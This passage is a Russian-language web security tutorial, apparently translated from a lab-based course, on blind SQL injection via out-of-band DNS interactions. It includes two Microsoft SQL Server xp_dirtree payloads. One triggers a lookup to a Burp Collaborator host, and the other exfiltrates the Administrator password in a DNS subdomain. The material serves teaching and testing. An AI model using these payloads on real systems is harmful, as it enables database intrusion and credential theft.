Приложение может выполнить тот же SQL-запрос, что и в предыдущем примере, но делать это асинхронно. Приложение продолжает обработку запроса пользователя в исходном потоке и использует другой поток для выполнения запроса SQL с использованием файла cookie отслеживания. Запрос по-прежнему уязвим для SQL-инъекций, но ни один из описанных выше методов не работает. Ответ приложения не зависит от запроса, возвращающего какие-либо данные, возникновения ошибки базы данных или от времени, затраченного на выполнение запроса.

В этой ситуации часто можно воспользоваться уязвимостью слепого внедрения SQL-кода, инициировав внешнее сетевое взаимодействие с системой, которой вы управляете. Их можно активировать на основе введенного условия для вывода информации по частям. Еще более полезно то, что данные могут быть удалены непосредственно в рамках сетевого взаимодействия.

Для этой цели можно использовать различные сетевые протоколы, но, как правило, наиболее эффективным является DNS. Многие производственные сети допускают бесплатное выход запросов DNS, потому что они необходимы для нормальной работы производственных систем.

Самый простой и надежный инструмент для использования внеполосных методов — Burp Collaborator. Это сервер, который предоставляет индивидуальные реализации различных сетевых служб, включая DNS.

Методы запуска DNS-запроса зависят от типа используемой базы данных. Например, следующий ввод в Microsoft SQL Server можно использовать для запуска поиска DNS в указанном домене:

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Это заставляет базу данных выполнить поиск следующего домена:

`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

#### Лаба
[[Лаборатория слепая инъекция SQL с внеполосной взаимодействием]]

Подтвердив способ запуска внеполосных взаимодействий, можно использовать канал вне полосы для эксфильтрата данных из уязвимого приложения. Например:
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Этот ввод считывает пароль для `Administrator` Пользователь добавляет уникальный поддомен сотрудников и запускает поиск DNS. Этот поиск позволяет просмотреть захваченный пароль:
`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

Методы внеполосной (OAST) являются мощным способом обнаружения и эксплуатации слепых инъекций SQL из-за высокой вероятности успеха и способности непосредственно эксфильтратировать данные в пределах канала. По этой причине методы OAST часто предпочтительны даже в ситуациях, когда работают другие методы слепой эксплуатации.

#### Лаба
[[Лаборатория слепая инъекция SQL с внеполосной эксфильтрацией]]